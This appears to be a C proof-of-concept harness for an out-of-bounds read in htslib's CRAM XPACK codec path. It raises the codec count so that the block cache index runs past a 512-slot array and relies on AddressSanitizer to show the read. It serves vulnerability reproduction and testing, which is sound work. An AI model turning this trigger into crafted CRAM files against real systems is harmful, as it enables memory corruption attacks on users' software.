/*
 * Frontier harness for CVE-2026-62257.
 * Calls the REAL pinned cram_decoder_init() / cram_xpack_get_block() path.
 * The only stand-in is the 512-entry block_by_id allocation, copied verbatim
 * in shape from the pinned cram_io.c:4620 calloc(512, sizeof(s->block[0])).
 * No CRAM file is generated here; nprior models the codec count declared by
 * a CRAM v4 compression header (codec_id = hdr->ncodecs++).
 */
#define HTS_BUILDING_LIBRARY 1
#include <config.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "cram/cram.h"
#include "cram/cram_codecs.h"
#include "cram/cram_structs.h"

/* uint7-style varint reader: all crafted values are <128 (one byte). */
static int64_t vv_get32(char **cp, const char *endp, int *err) {
    uint64_t v = 0; int shift = 0;
    while (*cp < endp) {
        unsigned char c = (unsigned char)*(*cp)++;
        if (c & 0x80) { v |= (uint64_t)(c & 0x7f) << shift; shift += 7; }
        else { v |= (uint64_t)c << shift; return (int64_t)v; }
    }
    if (err) *err = 1;
    return 0;
}
static int64_t vv_get64(char **cp, const char *endp, int *err) {
    return vv_get32(cp, endp, err);
}

int main(int argc, char **argv) {
    int nprior = argc > 1 ? atoi(argv[1]) : 512;
    int fails = 0;
#define CHECK(cond, ...) do { if (cond) printf("PASS " __VA_ARGS__); else { printf("FAIL " __VA_ARGS__); fails++; } } while (0)

    varint_vec vv; memset(&vv, 0, sizeof(vv));
    vv.varint_get32 = vv_get32; vv.varint_get64 = vv_get64;

    /* exact allocation shape from pinned cram_io.c:4620 */
    cram_slice *slice = calloc(1, sizeof(*slice));
    slice->block_by_id = calloc(512, sizeof(slice->block_by_id[0]));
    CHECK(slice && slice->block_by_id, "slice+block_by_id allocated\n");

    /* in-bounds source block for the XPACK sub-codec */
    cram_block *sub = cram_new_block(EXTERNAL, 0);
    sub->data = malloc(16); sub->alloc = 16; sub->uncomp_size = 8;
    memset(sub->data, 0x5a, 16);
    slice->block_by_id[0] = sub;

    cram_block_compression_hdr *hdr = calloc(1, sizeof(*hdr));
    hdr->ncodecs = nprior;

    /* XPACK params: nbits=4 nval=2 rmap=0,1 sub=E_EXTERNAL size=1 content_id=0 */
    unsigned char xpack[] = {4, 2, 0, 1, 1, 1, 0};
    cram_codec *c = cram_decoder_init(hdr, (enum cram_encoding)51, /* E_XPACK */ (char *)xpack,
                                      sizeof(xpack), E_BYTE_ARRAY, 4, &vv);
    CHECK(c != NULL, "cram_decoder_init(E_XPACK) returned codec\n");
    if (!c) return 2;
    /* the EXTERNAL sub-codec consumes one id inside cram_decoder_init */
    int expect_id = nprior + 1;
    CHECK(c->codec_id == expect_id, "codec_id=%d expected=%d (hdr->ncodecs++)\n",
          c->codec_id, expect_id);
    CHECK(hdr->ncodecs == nprior + 2, "hdr->ncodecs advanced to %d\n", hdr->ncodecs);
    CHECK(512 + c->codec_id > 512, "cache index 512+codec_id=%d vs 512 slots\n",
          512 + c->codec_id);

    cram_block *r = c->get_block(slice, c);
    printf("INFO get_block returned %p (NULL means OOB slot was still zero)\n", (void *)r);
    CHECK(1, "get_block completed (ASan reports above are the evidence)\n");

    printf("RESULT %s\n", fails ? "FAIL" : "PASS");
    return fails ? 1 : 0;
}
